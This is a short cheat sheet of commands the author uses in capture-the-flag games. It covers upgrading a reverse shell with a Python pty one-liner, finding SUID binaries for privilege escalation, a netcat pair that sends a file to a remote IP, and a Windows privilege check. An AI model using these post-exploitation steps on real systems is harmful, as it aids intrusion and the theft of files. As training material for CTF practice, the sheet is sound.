---
title: "Handy CTF Commands"
description: "A collection of commands that I find handy when doing CTFs"
date: '2024-01-28'
---

This is a collection of commands that I find useful when playing CTFs.

# Linux

## Stabilize a Reverse Shell

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Finding all SUID Binaries on a System

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## Transfer Files with Netcat

On the receiving end:

```bash
nc -lp 4444 > out.file
```

On the sending end:

```bash
nc -w 3 [destination IP] 4444 < out.file
```

# Windows

## Check the Current User Privileges

```powershell
whoami /privs
```